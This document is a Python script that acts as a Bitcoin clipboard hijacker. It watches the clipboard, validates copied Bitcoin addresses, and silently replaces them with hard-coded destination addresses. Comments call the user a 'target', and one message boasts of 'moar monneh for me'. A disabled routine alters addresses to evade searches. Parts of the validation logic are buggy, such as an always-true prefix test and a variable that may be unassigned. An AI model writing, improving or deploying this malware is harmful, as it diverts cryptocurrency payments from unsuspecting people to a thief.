#!python3
#coding: utf-8
#internal-version-tracking: 29

import codecs
import time
import os
import pyperclip
import random
from hashlib import sha256

digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

destinationAddresses = ['115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn','12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw'] # The adresses you want the found adresses replaced with
verboseMode = False # If you want output of results, or just the replacement done
randomReplacements = 3 # How many replacement chars in jiggled-adresses

def to_bytes(n, length):
	s = '%x' % n
	s = s.rjust(length*2, '0')
	s = codecs.decode(s.encode("UTF-8"), 'hex_codec')
	return s
#

def decode_base58(strAddress, length):
	n = 0
	for char in strAddress:
		n = n * 58 + digits58.index(char)
	return to_bytes(n, length)
#

def validate_bitcoin_address(strAddress):
	bcbytes = decode_base58(strAddress, 25)
	return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
#


def validate_clipboard_content(inputString):
	
	isValidWalletAddress = False
	
	if (inputString[:1] == '1' or '3'):
		
		if (len(inputString) > 23) and (len(inputString) < 40):
			
			if inputString.isalnum():
				
				isValidWallet = validate_bitcoin_address(inputString)
				
			#
		#
	#
	
	return isValidWallet
#


def HandleWalletAdresses(walletAddress):
	
	if walletAddress in destinationAddresses:
		
		# Known wallet, jiggle with address slightly to prevent target from copying it and search for it.
		# However, this has been disabled because it needs to intercept copy-function to know if user put it there or this script did
		
		#pyperclip.copy(jiggle_address(walletAddress))
		
		pass
		
	else:
		
		if verboseMode:
			print('Unknown address (' + walletAddress + '). Oh boy, gunna git gud, moar monneh for me!')
			print('Replacing address to :' + str(random.choice(destinationAddresses)))
		#
		
		pyperclip.copy(random.choice(destinationAddresses))
		
	#
	
	pass
#


def jiggle_address(walletAddress):
	
	global randomReplacements
	doneReplacements = 0
	
	newAddress = ''
	
	# Don't touch the first or last 8 parts of the adress, as this might be too visible
	jigglepart = walletAddress[8:-8]
	oldJigglepart = jigglepart
	
	while doneReplacements < randomReplacements:
		
		newJigglePart = ''
		
		charactertoswap = random.randint(0, len(jigglepart))
		
		for i, letter in enumerate(oldJigglepart):
			if i == charactertoswap:
				newJigglePart = newJigglePart + random.choice(digits58)
			else:
				newJigglePart = newJigglePart + letter
			pass
		#
		
		oldJigglepart = newJigglePart
		doneReplacements = doneReplacements + 1
	#
	
	addressIntro = str(walletAddress[:8])
	addressOutro = str(walletAddress[-8:])
	
	newAddress = addressIntro + newJigglePart + addressOutro
	
	if verboseMode:
		print('Old address:' + str(walletAddress))
		print('New address:' + str(newAddress))
	#
	
	return newAddress
#

previousValue = ''
tempValue = ''

while True:
	
	tempValue = pyperclip.paste()
	
	# Only do something if value has been replaced
	if tempValue != previousValue:
		
		previousValue = tempValue
		newValue = tempValue
		
		if validate_clipboard_content(newValue):
			
			if verboseMode:
				print('Wallet found: ' + str(newValue))
			#
			
			HandleWalletAdresses(newValue)
		#
	#
	
	time.sleep(1)
#